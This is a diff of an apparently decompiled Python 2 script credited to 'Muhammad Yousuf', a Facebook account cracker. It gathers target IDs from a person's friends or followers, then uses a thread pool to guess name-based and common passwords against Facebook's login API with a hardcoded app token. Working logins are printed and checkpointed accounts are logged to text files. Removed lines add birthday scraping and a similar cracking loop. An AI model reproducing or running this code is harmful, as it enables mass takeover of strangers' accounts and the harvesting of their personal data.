+				print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']											
+				print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user											
+				print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass1 + '\n'											
+				oks.append(user+pass1)
+                        else:
+			        if 'www.facebook.com' in q["error_msg"]:
+				    print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
+				    print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b ['name']
+				    print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
+				    print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass1 + '\n'
+				    cek = open("out/super_cp.txt", "a")
+				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
+				    cek.close()
+				    cekpoint.append(user+pass1)
+                                else:
+				    pass2 = b['first_name'] + '123'										
+                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			            q = json.load(data)												
+			            if 'access_token' in q:	
+				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				            z = json.loads(x.text)
+				            print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'											
+				            print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']											
+				            print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user								
+				            print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass2 + '\n'											
+				            oks.append(user+pass2)
+                                    else:
+			                   if 'www.facebook.com' in q["error_msg"]:
+				               print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
+				               print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
+				               print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
+				               print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass2 + '\n'
+				               cek = open("out/super_cp.txt", "a")
+				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
+				               cek.close()
+				               cekpoint.append(user+pass2)								
+				           else:											
+					       pass3 = b['last_name'] + '123'											
+					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
+					       q = json.load(data)										
+					       if 'access_token' in q:	
+						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                       z = json.loads(x.text)
+						       print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'								
+						       print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']									
+						       print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user							
+						       print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass3 + '\n'									
+						       oks.append(user+pass3)
+                                               else:
+			                               if 'www.facebook.com' in q["error_msg"]:
+				                           print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
+				                           print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
+				                           print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
+				                           print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass3 + '\n'
+				                           cek = open("out/super_cp.txt", "a")
+				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
+				                           cek.close()
+				                           cekpoint.append(user+pass3)									
+					               else:										
+						           pass4 = '000786'										
+			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			                                   q = json.load(data)												
+			                                   if 'access_token' in q:		
+						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                   z = json.loads(x.text)
+				                                   print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'											
+				                                   print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']											
+				                                   print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user											
+				                                   print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass4 + '\n'											
+				                                   oks.append(user+pass4)
+                                                           else:
+			                                           if 'www.facebook.com' in q["error_msg"]:
+				                                       print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
+				                                       print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
+				                                       print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
+				                                       print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass4 + '\n'
+				                                       cek = open("out/super_cp.txt", "a")
+				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
+				                                       cek.close()
+				                                       cekpoint.append(user+pass4)					
+					                           else:									
+						                       pass5 = '786786'							
+						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
+						                       q = json.load(data)								
+						                       if 'access_token' in q:	
+						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                               z = json.loads(x.text)
+						                               print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'						
+						                               print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']							
+						                               print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user					
+						                               print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass5 + '\n'							
+						                               oks.append(user+pass5)	
+                                                                       else:
+			                                                       if 'www.facebook.com' in q["error_msg"]:
+				                                                   print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
+				                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
+				                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
+				                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass5 + '\n'
+				                                                   cek = open("out/super_cp.txt", "a")
+				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
+				                                                   cek.close()
+				                                                   cekpoint.append(user+pass5)					
+						                               
+						                                    
 															
 		except:
 			pass
-		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print('')
-	print 47*'-'
-	print('')
-	print (' Process has completed')
-	print(' Total DOB :  '+str(len(nms)))
-	print('')
-	print 47*('-')
-	print('')
-	raw_input('\n Press enter to back ')
-	extract_dob()
-def dob():
-    global token
-    try:
-        token = open(".fb_token.txt","r").read()
-    except (KeyError , IOError):
-        time.sleep(1)
-        login()
-    os.system("clear")
-    logo()
-    print("")
-    print("\t    "+c+"Find DOB Of ID"+c2)
-    print("")
-    idt = raw_input(" Put id/user : ")
-    os.system("clear")
-    logo()
-    print("")
-    os.system('echo -e "\t   Finding DOB  " | lolcat')
-    time.sleep(1)
-    try:
-        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header).text
-        z = json.loads(r)
-        dobs = z["birthday"]
-    except (KeyError , IOError):
-        os.system("clear")
-        logo()
-        print("")
-        print("\t    "+c+"Find DOB Of ID"+c2)
-        print("")
-        print(" DOB not found")
-        print("")
-        raw_input(" Press enter to try again ")
-        extract_dob()
-    os.system("clear")
-    logo()
-    print("")
-    print("\t    "+c+"Find DOB Of ID"+c2)
-    print("")
-    print(" Account ID : "+idt)
-    print(" DOB : "+dobs)
-    print("")
-    print(47*"-")
-    print("")
-    conf()
-def conf():
-    ol = raw_input(" Do you want to find again (y/n) ")
-    if ol =="y":
-        dob()
-    elif ol =="n":
-        extract_dob()
-    else:
-        b_menu()
-def l_menu():
-    global token
-    os.system("clear")
-    logo()
-    try:
-        token = open(".fb_token.txt","r").read()
-    except (KeyError , IOError):
-        login()
-    try:
-        r = requests.get("https://graph.facebook.com/me?access_token="+token)
-        q = json.loads(r.text)
-        nm = q["name"]
-        nmf = nm.rsplit(" ")[0]
-        ok = nmf
-    except (KeyError , IOError):
-        print("")
-        print("\t    "+c+"ID has checkpoint"+c2)
-        print("")
-        os.system("rm -rf .fb_token.txt")
-        time.sleep(1)
-        login()
-    except requests.exceptions.ConnectionError:
-        logo()
-        print("")
-        print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
-        print("")
-        time.sleep(1)
-        raw_input(" Press enter to try again ")
-        b_menu()
-    os.system("clear")
-    logo()
-    print("")
-    print(47*"-")
-    print("")
-    print("\t  "+c+"Logged In User"+ok+c2)
-    print("")
-    print(47*"-")
-    print("")
-    print("[1] Crack from public id")
-    print("[2] Crack from followers")
-    print("[3] Return method menu")
-    print("[4] Logout")
-    print("")
-    l_menu_select()
-def l_menu_select():
-	select = raw_input("\nChoose Option >>> ")
-	id=[]
-	oks=[]
-	cps=[]
-	if select =="1":
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Public ID Cloning " | lolcat')
-		print("")
-		idt = raw_input(" Put Id/user :  ")
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Gathering Information " | lolcat')
-		print("")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system("clear")
-			logo()
-			print("")
-			os.system('echo -e "\t    Public ID Cloning " | lolcat')
-			print("")
-			print(" Target user : "+q["name"])
-		except (KeyError , IOError):
-		    print("")
-		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
-		    print("")
-		    raw_input("\nPress enter to back ")
-		    l_menu()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid=i['id']
-			na=i['name']
-			nm=na.rsplit(" ")[0]
-			id.append(uid+'|'+nm)
-	elif select =="2":
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Public ID Cloning " | lolcat')
-		print("")
-		idt = raw_input(" Put Id/user : ")
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Gathering Information " | lolcat')
-		print("")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-			q = json.loads(r.text)
-			os.system("clear")
-			logo()
-			print("")
-			os.system('echo -e "\t    Followers Cloning " | lolcat')
-			print("")
-			print(" Target user : "+q["name"])
-		except (KeyError , IOError):
-		    print("")
-		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
-		    print("")
-		    raw_input("\n Press enter to back ")
-		    l_menu()
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid=i['id']
-			na=i['name']
-			nm=na.rsplit(" ")[0]
-			id.append(uid+'|'+nm)
-	elif select =="3":
-		method_menu()
-	elif select =="4":
-	    logout()
-	else:
-	    print("")
-	    print("\t    "+c+"Select valid method"+c2)
-	    print("")
-	    l_menu_select()
-	print(" Total IDs : "+str(len(id)))
-	time.sleep(0.5)
-	print(" The process is running in background")
-	print("")
-	print 47*("-")
-	print('')
-	def main(arg):
-		user=arg
-		uid,name=user.split("|")
-		try:
-			pass1 = name+"123"
-			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
-			q = json.loads(data)
-			if "loc" in q:
-				print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
-				ok = open("ok.txt","a")
-				ok.write(uid+" | "+pass1+"\n")
-				ok.close()
-				oks.append(uid+pass1)
-			else:
-				if "www.facebook.com" in q["error"]:
-					print("[Checkpoint] "+uid+" | "+pass1)
-					cp = open("cp.txt","a")
-					cp.write(uid+" | "+pass1+"\n")
-					cp.close()
-					cps.append(uid+pass1)
-				else:
-					pass2 = name+"1234"
-					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
-					q = json.loads(data)
-					if "loc" in q:
-						print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
-						ok = open("ok.txt","a")
-						ok.write(uid+" | "+pass2+"\n")
-						ok.close()
-						oks.append(uid+pass2)
-					else:
-						if "www.facebook.com" in q["error"]:
-							print("[Checkpoint] "+uid+" | "+pass2)
-							cp = open("cp.txt","a")
-							cp.write(uid+" | "+pass2+"\n")
-							cp.close()
-							cps.append(uid+pass2)
-						else:
-							pass3 = name+"12345"
-							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
-							q = json.loads(data)
-							if "loc" in q:
-								print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
-								ok = open("ok.txt","a")
-								ok.write(uid+" | "+pass3+"\n")
-								ok.close()
-								oks.append(uid+pass3)
-							else:
-								if "www.facebook.com" in q["error"]:
-									print("[Checkpoint] "+uid+" | "+pass3)
-									cp = open("cp.txt","a")
-									cp.write(uid+" | "+pass3+"\n")
-									cp.close()
-									cps.append(uid+pass3)
-								else:
-									pass4 = name+"786"
-									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
-									q = json.loads(data)
-									if "loc" in q:
-										print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
-										ok = open("ok.txt","a")
-										ok.write(uid+" | "+pass4+"\n")
-										ok.close()
-										oks.append(uid+pass4)
-									else:
-										if "www.facebook.com" in q["error"]:
-											print("[Checkpoint] "+uid+" | "+pass4)
-											cp = open("cp.txt","a")
-											cp.write(uid+" | "+pass4+"\n")
-											cp.close()
-											cps.apppend(uid+pass4)
-										else:
-											pass5 = "786786"
-											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
-											q = json.loads(data)
-											if "loc" in q:
-												print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
-												ok = open("ok.txt","a")
-												ok.write(uid+" | "+pass5+"\n")
-												ok.close()
-												oks.append(uid+pass5)
-											else:
-												if "www.facebook.com" in q["error"]:
-													print("[Checkpoint] "+uid+" | "+pass5)
-													cp = open("cp.txt","a")
-													cp.write(uid+" | "+pass5+"\n")
-													cp.close()
-													cps.append(uid+pass5)
-												else:
-													pass6 = "786000"
-													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
-													q = json.loads(data)
-													if "loc" in q:
-														print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
-														ok = open("ok.txt","a")
-														ok.write(uid+" | "+pass6+"\n")
-														ok.close()
-														oks.append(uid+pass6)
-													else:
-														if "www.facebook.com" in q["error"]:
-															print("[Checkpoint] "+uid+" | "+pass6)
-															cp = open("cp.txt","a")
-															cp.write(uid+" | "+pass6+"\n")
-															cp.close()
-															cps.append(uid+pass6)
-														else:
-															pass7 = "Pakistan"
-															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
-															q = json.loads(data)
-															if "loc" in q:
-																print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
-																ok = open("ok.txt","a")
-																ok.write(uid+" | "+pass7+"\n")
-																ok.close()
-																oks.append(uid+pass7)
-															else:
-																if "www.facebook.com" in q["error"]:
-																	print("[Checkpoint] "+uid+" | "+pass7)
-																	cp = open("cp.txt","a")
-																	cp.write(uid+" | "+pass7+"\n")
-																	cp.close()
-																	cps.append(uid+pass7)
-																
-		except:
-			pass
+	print "\033[1;93m•◈•▬ ▬ ▬•◈\033[1;93mMuhammad Yousuf\033[1;93m◈•▬ ▬ ▬•◈•"
+	print "  \033[1;92m«---•◈•---Developed By Muhammad Yousuf--•◈•---»" #Dev:Jam
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Mishal.py)↩\033[1;97m....'
+	print"\033[1;92mTotal OK/\x1b[1;92mCP \033[1;92m: \033[1;92m"+str(len(oks))+"\033[1;92m/\033[1;93m"+str(len(cekpoint))
+	print """
+
+╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+   ╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+      ┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+      ╰╯╰━━┻━━┻━━┻━━╯╰╯
+ 
+         Checkpoint ID Open After 14 Days
+•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
+: \033[1;92m ..Yousuf Creations.. \033[1;92m :
+•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
+                Facebook
+              \033[1;91mMuhammadYousuf22"""
 	
-	p = ThreadPool(30)
-	p.map(main,id)
-	print("")
-	print(47*"-")
-	print("")
-	print(" The process has completed")
-	print(" Total Ok/Cp :"+str(len(oks)))+"/"+str(len(cps))
-	print("")
-	print(47*"-")
-	print("")
-	raw_input(" Press entet to back ")
-	l_menu()
+	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
+	menu()
+
 if __name__ == '__main__':
-    method_menu()
+	login()
+
+
+# Okay Decompiling YousufDhoom/YousufDhoom.py
